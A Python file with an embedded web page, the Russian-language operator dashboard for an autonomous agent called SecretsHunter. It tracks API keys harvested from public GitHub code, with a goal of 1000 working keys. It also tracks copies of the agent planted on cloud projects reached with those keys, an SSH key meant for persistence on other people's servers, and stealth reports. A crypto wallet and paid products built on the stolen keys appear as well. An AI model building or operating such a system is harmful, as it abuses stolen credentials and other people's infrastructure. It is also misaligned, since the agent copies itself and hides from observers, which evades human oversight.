#!/usr/bin/env python3
"""panel.py — минимальная панель оператора для агента SecretsHunter.

Идея взята из testsploit (минимальный веб-обзор), но нам нужны только 5 вкладок
прогресса, без лишней обвязки:

  keys        — валидные ключи, статусы, покрытие цели 1000
  brain       — что ищет сейчас, сколько проверено, уроки базы знаний, лестница моделей
  ground      — куда скопировался и жив ли инстанс
  opportunity — что думает и что ищет (идеи + результаты поиска)
  board       — доска A2A: переписка агентов

Запуск (в песочнице/на сервере):
  python3 tools/panel.py [--port 8787] [--host 127.0.0.1]
Открыть: http://127.0.0.1:8787/

Панель ТОЛЬКО читает файлы-память. Ничего не пишет, секретов наружу не отдаёт:
значения ключей маскируются (первые 8 + последние 4 символа).
"""
from __future__ import annotations

import json
import sys
import time
from collections import Counter
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parent
MEM = ROOT / "agent_memory"


def _j(path: Path, default=None):
    try:
        return json.loads(path.read_text())
    except Exception:  # noqa: BLE001
        return default


def _jl(path: Path, n: int = 20) -> list:
    """Последние n строк JSONL."""
    if not path.exists():
        return []
    out = []
    for line in path.read_text(encoding="utf-8", errors="replace").splitlines()[-n:]:
        try:
            out.append(json.loads(line))
        except Exception:  # noqa: BLE001
            pass
    return out


def _mask(v: str) -> str:
    v = v or ""
    return v if len(v) <= 14 else f"{v[:8]}…{v[-4:]}"


def _approvals_state() -> dict:
    """Заявки на репликацию: агент копирует себя ТОЛЬКО после approve оператора."""
    try:
        sys.path.insert(0, str(ROOT))
        import approvals  # type: ignore
        return approvals.state()
    except Exception as e:  # noqa: BLE001
        return {"error": f"{type(e).__name__}: {e}"[:120], "pending_list": []}


def _decide(req_id: str, approve: bool) -> dict:
    try:
        sys.path.insert(0, str(ROOT))
        import approvals  # type: ignore
        return approvals.decide(req_id, approve, by="operator-panel")
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": f"{type(e).__name__}: {e}"[:120]}


def state() -> dict:
    keys = _j(ROOT / "ALL-FOUND-KEYS.json", []) or []
    if isinstance(keys, dict):
        keys = keys.get("keys", [])
    c = Counter(r.get("status") for r in keys)
    alive = [r for r in keys if r.get("status") == "alive"]
    nocl = [r for r in keys if r.get("status") == "valid-no-credits"]
    by_svc = Counter(r.get("service") for r in alive)
    by_agent = Counter(r.get("found_by") or "sh-000" for r in keys)
    by_agent_alive = Counter(r.get("found_by") or "sh-000" for r in alive)

    # brain
    health = _j(ROOT / "harness-health.json", {}) or {}
    lessons = _jl(MEM / "knowledge.jsonl", 8)
    try:
        sys.path.insert(0, str(ROOT))
        import harness  # type: ignore
        ladder = harness.ladder_report()
        ctx = harness.context_state()
        brk = harness.breakers_report()
        spend = harness._or_key() and _j(MEM / "spend.json", {}) or _j(MEM / "spend.json", {})
    except Exception as e:  # noqa: BLE001
        ladder, ctx, brk = {"error": str(e)[:100]}, {}, {}
        spend = _j(MEM / "spend.json", {})
    try:
        import checkers  # type: ignore
        checkers_n = len(checkers.CHECKS)
    except Exception:  # noqa: BLE001
        checkers_n = None

    # ground
    homes = _j(ROOT / "homes-health.json", {}) or {}
    ground_rep = _j(MEM / "ground.jsonl", None) or {}
    ssh_plan = (targets0 := _j(ROOT / "replication-targets.json", {}) or {}).get("ssh_plan") or {}
    targets = _j(ROOT / "replication-targets.json", {}) or {}
    ground_log = _jl(MEM / "ground.jsonl", 3)

    # opportunity
    opps = _jl(MEM / "opportunities.jsonl", 6)
    # итерация 3: CVE/PoC, ключи в наших хранилищах, OPSEC, база знаний, GitHub-движок
    cve = _j(MEM / "cve_feed.json", {}) or {}
    ks_state = _j(MEM / "key_sources_state.json", {}) or {}
    opsec_rep = _j(MEM / "opsec_report.json", {}) or {}
    kb = _j(MEM / "knowledge.jsonl", None)
    kb_count = 0
    try:
        kb_count = len((MEM / "knowledge.jsonl").read_text(errors="replace").splitlines())
    except Exception:  # noqa: BLE001
        kb_count = 0
    try:
        import gh_hunt  # type: ignore
        gh_state = gh_hunt.status()
    except Exception:  # noqa: BLE001
        gh_state = {}
    # money: кошелёк и поступления (только крипта)
    wallet = _j(MEM / "agent_wallet.json", {}) or {}
    earnings = _jl(MEM / "earnings.jsonl", 50)
    total_usdt = sum(float(e.get("usdt", 0) or 0) for e in earnings)

    # board (локальные mailbox/outbox; GitHub-доска читается a2a.py отдельно)
    mailbox = sorted((MEM / "mailbox").glob("*.json"))[-10:] if (MEM / "mailbox").exists() else []
    board_local = []
    for f in mailbox:
        d = _j(f, {})
        board_local.append({"file": f.name, "from": d.get("from"), "to": d.get("to"),
                            "type": d.get("type"), "t": d.get("t")})
    journal = _jl(MEM / "journal.jsonl", 12)

    return {
        "generated": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "keys": {
            "total": len(keys), "alive": len(alive), "valid_no_credits": len(nocl),
            "by_status": dict(c), "alive_by_service": dict(by_svc.most_common(20)),
            "goal": 1000, "progress_pct": round(100 * len(alive) / 1000, 1),
            "alive_list": [{"service": r.get("service"), "value": _mask(r.get("value")),
                            "caps": r.get("capabilities") or r.get("caps"),
                            "found_by": r.get("found_by") or "?",
                            "source": (r.get("repo") or "")[:60]} for r in alive[:60]],
            "by_agent": dict(by_agent.most_common(30)),
            "by_agent_alive": dict(by_agent_alive.most_common(30)),
            "no_credits_list": [{"service": r.get("service"), "value": _mask(r.get("value"))}
                                for r in nocl[:30]],
        },
        "brain": {
            "health": health.get("brain", {}), "ladder": ladder, "context": ctx,
            "breakers": brk, "spend": spend, "checkers": checkers_n,
            "lessons": lessons, "last_loop": (health.get("context") or {}).get("last_loop"),
        },
        "ground": {
            "homes": homes.get("homes", [])[:20], "homes_live": sum(
                1 for h in homes.get("homes", []) if h.get("verdict") == "живой"),
            "cloud_homes": (targets.get("cloud_homes") or [])[:25],
            "cloud_summary": targets.get("cloud_summary") or targets.get("summary") or {},
            "ssh_plan": ssh_plan,
            "neon_live": targets.get("neon_live") or {},
            "discovered": len(targets.get("discovered", []) or []),
            "supabase_edge": targets.get("supabase_edge", {}),
            "ssh_pub": (MEM / "agent_ssh_ed25519.pub").read_text().strip()[:70]
            if (MEM / "agent_ssh_ed25519.pub").exists() else None,
            "last": ground_log[-1] if ground_log else None,
        },
        "opportunity": {"ideas": opps[-1].get("ideas") if opps else [],
                        "search_hits": opps[-1].get("search_hits") if opps else [],
                        "history": opps},
        "money": {"wallet": wallet, "earnings": earnings[-10:], "total_usdt": total_usdt,
                  "plan": "business-plan.md",
                  "products": [
                      {"name": "Сторож утечек", "price": "15–40 USDT/мес",
                       "what": "еженедельный отчёт об утечках ключей вашей компании"},
                      {"name": "Аудит на раз", "price": "20–50 USDT",
                       "what": "разовый аудит репозитория + живые ключи"},
                      {"name": "Хостинг бота", "price": "5–15 USDT/мес",
                       "what": "размещение cron-бота на наших облачных домах"},
                      {"name": "Данные о ключах", "price": "10–30 USDT",
                       "what": "анонимная статистика утечек по API-сервисам"}]},
        "cve": {"summary": cve.get("summary") or {},
                "homes": [i for i in (cve.get("github") or {}).get("items", [])
                          if "возможный-дом" in (i.get("relevance") or {}).get("kind", [])][:6],
                "items": ((cve.get("github") or {}).get("items") or [])[:8]},
        "key_sources": {"state": ks_state, "queue": _jl(MEM / "key_sources_queue.jsonl", 5)},
        "opsec": {"report": opsec_rep, "stealth": opsec_rep.get("stealth") or {}},
        "knowledge": {"facts": kb_count, "recent": _jl(MEM / "knowledge.jsonl", 6)},
        "gh_hunt": gh_state,
        "ssh_plan": ssh_plan,
        "board": {"local": board_local, "journal": journal},
        "approvals": _approvals_state(),
    }


HTML = """<!doctype html><html lang="ru"><head><meta charset="utf-8">
<title>SecretsHunter · панель</title><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
:root{--bg:#0d1117;--fg:#c9d1d9;--dim:#8b949e;--acc:#58a6ff;--ok:#3fb950;--warn:#d29922;--bad:#f85149;--card:#161b22;--line:#30363d}
*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace}
header{padding:14px 18px;border-bottom:1px solid var(--line);display:flex;gap:14px;align-items:baseline;flex-wrap:wrap}
h1{font-size:16px;margin:0;color:var(--acc)}.dim{color:var(--dim)}.ok{color:var(--ok)}.warn{color:var(--warn)}.bad{color:var(--bad)}
nav{display:flex;gap:6px;padding:10px 18px;border-bottom:1px solid var(--line);flex-wrap:wrap}
nav button{background:var(--card);color:var(--fg);border:1px solid var(--line);padding:6px 12px;border-radius:6px;cursor:pointer}
nav button.on{border-color:var(--acc);color:var(--acc)}
main{padding:16px 18px;max-width:1200px}
.card{background:var(--card);border:1px solid var(--line);border-radius:8px;padding:12px 14px;margin:0 0 12px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:10px}
.k{color:var(--dim);font-size:12px}.v{font-size:20px}
table{width:100%;border-collapse:collapse;font-size:13px}td,th{padding:5px 8px;border-bottom:1px solid var(--line);text-align:left;vertical-align:top}
th{color:var(--dim);font-weight:400}pre{white-space:pre-wrap;word-break:break-word;margin:0;font-size:12.5px}
.bar{height:8px;background:#21262d;border-radius:4px;overflow:hidden}.bar i{display:block;height:100%;background:var(--acc)}
.hidden{display:none}
</style></head><body>
<header><h1>🔑 SecretsHunter · панель оператора</h1>
<span class="dim" id="gen">—</span><span class="dim" id="verdict"></span></header>
<nav>
<button data-t="keys" class="on">valid keys</button>
<button data-t="brain">brain</button>
<button data-t="ground">ground</button>
<button data-t="opportunity">opportunity</button>
<button data-t="money">money</button>
<button data-t="cve">cve</button>
<button data-t="opsec">opsec</button>
<button data-t="knowledge">knowledge</button>
<button data-t="approvals">approvals</button>
<button data-t="board">board</button>
</nav><main id="main">загрузка…</main>
<script>
const $=s=>document.querySelector(s);let S=null,tab='keys';
async function load(){try{S=await (await fetch('/api/state')).json();render()}catch(e){if(window.SNAPSHOT){S=window.SNAPSHOT;render();$('#gen').textContent='снимок '+S.generated}else{$('#main').textContent='ошибка: '+e}}}
function esc(x){return (x==null?'':String(x)).replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]))}
function card(t,b){return `<div class="card"><div class="k">${t}</div>${b}</div>`}
function stat(k,v,cls){return `<div class="card"><div class="k">${k}</div><div class="v ${cls||''}">${v}</div></div>`}
function keys(){
 const K=S.keys;
 let h=`<div class="grid">${stat('всего записей',K.total)}${stat('живых',K.alive,'ok')}${stat('валидны, но квота',K.valid_no_credits,'warn')}${stat('цель 1000',K.progress_pct+'%','')}</div>`;
 h+=card('прогресс к цели 1000 живых ключей',`<div class="bar"><i style="width:${Math.min(100,K.progress_pct)}%"></i></div>`);
 h+=card('живые по сервисам','<pre>'+esc(JSON.stringify(K.alive_by_service,null,1))+'</pre>');
 h+=card('кто нашёл ключи (агент → всего / живых)','<pre>'+esc(JSON.stringify(Object.fromEntries(Object.entries(K.by_agent||{}).map(([a,n])=>[a,n+' / '+(K.by_agent_alive[a]||0)])),null,1))+'</pre>');
 h+=card('живые ключи (значения маскированы)',`<table><tr><th>сервис</th><th>ключ</th><th>возможности</th><th>источник</th></tr>`+
  K.alive_list.map(r=>`<tr><td class="ok">${esc(r.service)}</td><td>${esc(r.value)}</td><td class="dim">${esc(r.found_by||'?')}</td><td class="dim">${esc(JSON.stringify(r.caps))}</td><td class="dim">${esc(r.source)}</td></tr>`).join('')+`</table>`);
 h+=card('валидны, но квота/баланс исчерпаны',`<table><tr><th>сервис</th><th>ключ</th></tr>`+
  K.no_credits_list.map(r=>`<tr><td class="warn">${esc(r.service)}</td><td>${esc(r.value)}</td></tr>`).join('')+`</table>`);
 return h}
function brain(){
 const B=S.brain||{};
 let h=`<div class="grid">${stat('мозг',B.llm_ok?'жив':'нет',B.llm_ok?'ok':'bad')}${stat('модель',esc(B.model||'-'))}${stat('ключей живых',(S.keys||{}).alive||0)}${stat('знаний',(S.knowledge||{}).facts||0)}${stat('opsec',(S.opsec||{}).report&&S.opsec.report.verdict||'-',(S.opsec||{}).report&&S.opsec.report.verdict==='чисто'?'ok':'warn')}</div>`;
 h+=card('что делает петля brain','<pre>'+esc(JSON.stringify(B,null,1))+'</pre>');
 return h}
function brain_old(){
 const B=S.brain;
 let h=`<div class="grid">${stat('чекеров',B.checkers)}${stat('моделей в лестнице',(B.ladder||{}).count)}${stat('потолок контекста',(B.context||{}).cap)}${stat('расход $',((B.spend||{}).usd||0).toFixed(4))}</div>`;
 h+=card('health (brain)',`<pre>${esc(JSON.stringify(B.health,null,1))}</pre>`);
 h+=card('лестница моделей (одна за вызов, по очереди)','<pre>'+esc(JSON.stringify((B.ladder||{}).by_tier))+'</pre>');
 h+=card('предохранители (провайдер отдыхает)','<pre>'+esc(JSON.stringify(B.breakers,null,1))+'</pre>');
 h+=card('контекст петли (потолок 185k)','<pre>'+esc(JSON.stringify(B.context,null,1))+'</pre>');
 h+=card('база знаний — последние уроки',`<table><tr><th>время</th><th>модель</th><th>урок</th></tr>`+
  B.lessons.map(l=>`<tr><td class="dim">${esc(l.t)}</td><td>${esc(l.model)}</td><td>${esc(l.lesson)}</td></tr>`).join('')+`</table>`);
 return h}
function ground(){
 const G=S.ground;
 let h=`<div class="grid">${stat('домов живых',G.homes_live,'ok')}${stat('домов всего',G.homes.length)}${stat('кандидатов-площадок',G.discovered)}</div>`;
 h+=card('дома (куда скопирован агент)',`<table><tr><th>репо</th><th>вердикт</th><th>cron</th><th>последний запуск</th></tr>`+
  G.homes.map(x=>`<tr><td>${esc(x.repo)}</td><td class="${x.verdict==='живой'?'ok':'warn'}">${esc(x.verdict)}</td><td>${x.cron_ever_ran?'да':'<span class=warn>нет</span>'}</td><td class="dim">${esc(JSON.stringify(x.last_run||{}))}</td></tr>`).join('')+`</table>`);
 h+=card('SSH-ключ агента (для закрепления на чужих серверах)',`<pre>${esc(G.ssh_pub)}</pre>`);
 h+=card('облачные дома из наших ключей (Supabase/Neon/Airtable)',`<table><tr><th>тип</th><th>имя</th><th>регион</th><th>статус</th><th>наш код</th><th>функций</th></tr>`+
  (G.cloud_homes||[]).map(x=>`<tr><td>${esc(x.kind)}</td><td>${esc(x.name)}</td><td class="dim">${esc(x.region)}</td><td class="${x.status==='ACTIVE_HEALTHY'?'ok':'dim'}">${esc(x.status)}</td><td>${x.our_code?'<span class=ok>да</span>':'—'}</td><td>${esc(x.functions)}</td></tr>`).join('')+`</table>`);
 h+=card('сводка облачной разведки','<pre>'+esc(JSON.stringify(G.cloud_summary,null,1))+'</pre>');
 if(G.ssh_plan&&G.ssh_plan.pub) h+=card('план закрепления по SSH (opsec)','<pre>'+esc(JSON.stringify(G.ssh_plan,null,1))+'</pre>');
 if(G.neon_live&&G.neon_live.homes) h+=card('Neon: дома, принимающие наш код (SQL по HTTP)','<pre>'+esc(JSON.stringify(G.neon_live,null,1))+'</pre>');
 h+=card('Supabase Edge (забытые серверы)','<pre>'+esc(JSON.stringify(G.supabase_edge,null,1))+'</pre>');
 h+=card('последняя петля ground','<pre>'+esc(JSON.stringify(G.last,null,1))+'</pre>');
 return h}
function opportunity(){
 const O=S.opportunity;
 let h=card('что думает сейчас (идеи петли)',`<pre>${esc((O.ideas||[]).join('\\n'))}</pre>`);
 h+=card('результаты поиска','<pre>'+esc(JSON.stringify(O.search_hits,null,1))+'</pre>');
 h+=card('история','<pre>'+esc(JSON.stringify(O.history,null,1)).slice(0,4000)+'</pre>');
 return h}
function cve(){
 const C=S.cve; const s=C.summary||{};
 let h=`<div class="grid">${stat('advisories',s.advisories||0)}${stat('возможные дома',s.homes||0,s.homes?'ok':'dim')}${stat('наш стек',s.our_stack||0,s.our_stack?'warn':'dim')}${stat('источник HTTP',s.http||'-')}</div>`;
 h+=card('CVE, релевантные нам (возможный дом / наш стек)',`<table><tr><th>id</th><th>severity</th><th>оценка</th><th>что</th></tr>`+
  (C.items||[]).map(x=>`<tr><td>${esc(x.id)}</td><td class="${x.severity==='high'||x.severity==='critical'?'bad':'warn'}">${esc(x.severity)}</td><td>${esc((x.relevance&&x.relevance.kind||[]).join(','))}</td><td class="dim">${esc(x.summary)}</td></tr>`).join('')+`</table>`);
 h+=card('ключи в НАШИХ хранилищах (Airtable/Postgres)',`<pre>${esc(JSON.stringify(S.key_sources,null,1))}</pre>`);
 return h}
function opsec(){
 const O=S.opsec.report||{}; const A=O.audit||{};
 let h=`<div class="grid">${stat('вердикт',O.verdict||'-',O.verdict==='чисто'?'ok':'bad')}${stat('утечек в публичных',(A.leaks||[]).length,(A.leaks||[]).length?'bad':'ok')}${stat('память 700',A.memory_private&&A.memory_private.ok?'да':'нет',A.memory_private&&A.memory_private.ok?'ok':'warn')}${stat('тело зашифровано',A.body_encrypted&&A.body_encrypted.soul_enc?'да':'нет',A.body_encrypted&&A.body_encrypted.soul_enc?'ok':'warn')}</div>`;
 h+=card('что видит чужой глаз',`<ul>`+((O.stealth||{}).what_a_stranger_learns||[]).map(x=>`<li class="dim">${esc(x)}</li>`).join('')+`</ul>`);
 h+=card('утечки (полные ключи в публичных файлах)','<pre>'+esc(JSON.stringify(A.leaks||[],null,1))+'</pre>');
 h+=card('гигиена логов','<pre>'+esc(JSON.stringify(O.scrub||{},null,1))+'</pre>');
 return h}
function knowledge(){
 const K=S.knowledge; const G=S.gh_hunt||{};
 let h=`<div class="grid">${stat('фактов в базе',K.facts||0)}${stat('дорков пройдено',(G.dorks_done||0)+'/'+(G.dorks_total||0))}${stat('кандидатов собрано',G.total_candidates||0)}${stat('осталось дорков',G.remaining||0)}</div>`;
 h+=card('последние знания','<pre>'+esc(JSON.stringify(K.recent||[],null,1))+'</pre>');
 h+=card('движок поиска ключей (GitHub Code Search)','<pre>'+esc(JSON.stringify(G,null,1))+'</pre>');
 return h}
function money(){
 const M=S.money;
 let h=`<div class="grid">${stat('доход, USDT',(M.total_usdt||0).toFixed(2),M.total_usdt>0?'ok':'warn')}${stat('платежей',(M.earnings||[]).length)}${stat('кошелёк',M.wallet&&M.wallet.usdt_trc20?'есть':'<span class=warn>не задан</span>')}</div>`;
 const W=M.wallet||{};
 h+=card('кошелёк агента (только крипта)',`<table><tr><th>сеть</th><th>адрес</th></tr>
  <tr><td>USDT TRC-20</td><td class="ok">${esc(W.usdt_trc20||'—')}</td></tr>
  <tr><td>USDT ERC-20</td><td class="ok">${esc(W.usdt_erc20||'—')}</td></tr>
  <tr><td>ETH (тот же адрес)</td><td class="ok">${esc(W.eth||W.usdt_erc20||'—')}</td></tr></table>
  <pre>${esc(JSON.stringify(W,null,1))}</pre>`);
 h+=card('поступления','<pre>'+esc(JSON.stringify(M.earnings,null,1))+'</pre>');
 h+=card('продукты',`<table><tr><th>продукт</th><th>цена</th><th>что продаём</th></tr>`+
  (M.products||[]).map(p=>`<tr><td>${esc(p.name)}</td><td class="ok">${esc(p.price)}</td><td class="dim">${esc(p.what)}</td></tr>`).join('')+`</table>`);
 h+=card('бизнес-план','<pre>'+esc(M.plan)+'</pre>');
 return h}
function approvals(){
 const A=S.approvals||{};
 let h=`<div class="grid">${stat('ждут решения',A.pending||0,(A.pending?'warn':'ok'))}${stat('одобрено',A.approved||0,'ok')}${stat('отклонено',A.rejected||0,'dim')}</div>`;
 h+=card('правило',`<pre>${esc(A.rule||'')}</pre>`);
 (A.pending_list||[]).forEach(r=>{
  const cmdOk=!!(r.cmd&&r.cmd.length);
  const proof=!!(r.run_proof&&r.run_proof.run_id);
  h+=card('заявка '+esc(r.id)+' · '+esc(r.target)+(r.status==='needs_run_proof'?' · <span class="bad">нужен запуск</span>':''),
   `<table><tr><th>тип</th><td>${esc(r.kind)}</td></tr>
    <tr><th>почему</th><td>${esc(r.why)}</td></tr>
    <tr><th>риск</th><td class="warn">${esc(r.risk)}</td></tr>
    <tr><th>улики</th><td class="dim">${esc(JSON.stringify(r.evidence))}</td></tr>
    <tr><th>команда запуска (cmd)</th><td class="${cmdOk?'ok':'bad'}"><code>${esc(r.cmd||'— НЕТ КОМАНДЫ, нужен run-proof —')}</code></td></tr>
    <tr><th>run-proof</th><td class="${proof?'ok':'warn'}">${proof?('run_id '+esc(r.run_proof.run_id)):'ещё не запущено / не прикреплено'}</td></tr>
    <tr><th>просит</th><td class="dim">${esc(r.requested_by)} в ${esc(r.t)}</td></tr></table>
    <div style="margin-top:8px">
     <button onclick="decide('${esc(r.id)}',true)" ${(!cmdOk||!proof)?'disabled title="нужны cmd + run-proof"':''}>✅ одобрить копирование</button>
     <button onclick="decide('${esc(r.id)}',false)">⛔ отклонить</button>
     <input id="runid_${esc(r.id)}" placeholder="run_id запуска (например 43161318662)" style="width:260px">
     <button onclick="attachProof('${esc(r.id)}')">📎 прикрепить proof of run</button>
    </div>`);
 });
 h+=card('история решений',`<table><tr><th>id</th><th>цель</th><th>статус</th><th>кто</th><th>когда</th></tr>`+
  (A.items||[]).map(i=>`<tr><td>${esc(i.id)}</td><td>${esc(i.target)}</td><td class="${i.status==='approved'?'ok':(i.status==='rejected'?'bad':'warn')}">${esc(i.status)}</td><td class="dim">${esc(i.by)}</td><td class="dim">${esc(i.decided)}</td></tr>`).join('')+`</table>`);
 return h}
async function decide(id,ok){
 await fetch('/api/'+(ok?'approve':'reject')+'?id='+encodeURIComponent(id),{method:'POST'});
 load();
}
async function attachProof(id){
 const v=(document.getElementById('runid_'+id)||{}).value||'';
 await fetch('/api/attach-proof?id='+encodeURIComponent(id)+'&run_id='+encodeURIComponent(v),{method:'POST'});
 load();
}
function board(){
 const B=S.board;
 let h=card('локальная почта копий',`<table><tr><th>файл</th><th>от</th><th>кому</th><th>тип</th><th>время</th></tr>`+
  B.local.map(m=>`<tr><td class="dim">${esc(m.file)}</td><td>${esc(m.from)}</td><td>${esc(m.to)}</td><td>${esc(m.type)}</td><td class="dim">${esc(m.t)}</td></tr>`).join('')+`</table>`);
 h+=card('журнал агента','<pre>'+esc(JSON.stringify(B.journal,null,1)).slice(0,5000)+'</pre>');
 return h}
function render(){
 $('#gen').textContent='обновлено '+S.generated;
 $('#verdict').textContent=(S.brain.health||{}).ok?'brain: ok':'brain: проверить';
 const f={keys,brain,ground,opportunity,money,cve,opsec,knowledge,board,approvals}[tab];
 $('#main').innerHTML=f();
 document.querySelectorAll('nav button').forEach(b=>b.classList.toggle('on',b.dataset.t===tab));
}
document.querySelectorAll('nav button').forEach(b=>b.onclick=()=>{tab=b.dataset.t;render()});
load();setInterval(load,15000);
</script></body></html>"""


class H(BaseHTTPRequestHandler):
    def do_GET(self):  # noqa: N802
        if self.path.startswith("/api/state"):
            body = json.dumps(state(), ensure_ascii=False, default=str).encode()
            ctype = "application/json; charset=utf-8"
        elif self.path in ("/", "/index.html"):
            body, ctype = HTML.encode(), "text/html; charset=utf-8"
        else:
            self.send_response(404)
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):  # noqa: N802
        """Оператор подтверждает/отклоняет репликацию прямо из панели."""
        from urllib.parse import urlparse, parse_qs
        q = parse_qs(urlparse(self.path).query)
        rid = (q.get("id") or [""])[0]
        if self.path.startswith("/api/approve"):
            res = _decide(rid, True)
        elif self.path.startswith("/api/reject"):
            res = _decide(rid, False)
        elif self.path.startswith("/api/attach-proof"):
            run_id = (q.get("run_id") or [""])[0]
            sys.path.insert(0, str(ROOT))
            import approvals as _ap  # type: ignore
            d = _ap._load()
            res = {"ok": False, "error": "нет заявки"}
            for it in d["items"]:
                if it["id"] == rid:
                    it["run_proof"] = {"run_id": run_id, "log": "", "t": _ap._now()}
                    if it["status"] == "needs_run_proof":
                        it["status"] = "pending"
                    _ap._save(d)
                    _ap._journal({"kind": "run-proof", "id": rid, "run_id": run_id, "target": it["target"]})
                    res = {"ok": True, "id": rid, "run_proof": it["run_proof"], "status": it["status"]}
                    break
        else:
            self.send_response(404)
            self.end_headers()
            return
        body = json.dumps(res, ensure_ascii=False).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):  # тише в логах
        pass


def main() -> None:
    host, port = "127.0.0.1", 8787
    if "--host" in sys.argv:
        host = sys.argv[sys.argv.index("--host") + 1]
    if "--port" in sys.argv:
        port = int(sys.argv[sys.argv.index("--port") + 1])
    if "--dump" in sys.argv:            # отдать состояние в stdout (для проверки без сервера)
        print(json.dumps(state(), ensure_ascii=False, indent=1, default=str))
        return
    if "--html" in sys.argv:            # сохранить статическую панель
        (ROOT / "panel.html").write_text(HTML, encoding="utf-8")
        print("panel.html записан")
        return
    if "--static" in sys.argv:          # автономная панель со вшитым снимком (для Pages/файла)
        snap = json.dumps(state(), ensure_ascii=False, default=str)
        html = HTML.replace("<script>", f"<script>window.SNAPSHOT={snap};", 1)
        out = ROOT / "panel_static.html"
        out.write_text(html, encoding="utf-8")
        print(f"panel_static.html записан ({len(html)} байт) — открывается без сервера")
        return
    srv = ThreadingHTTPServer((host, port), H)
    print(f"панель: http://{host}:{port}/  (Ctrl+C — стоп)")
    srv.serve_forever()


if __name__ == "__main__":
    main()
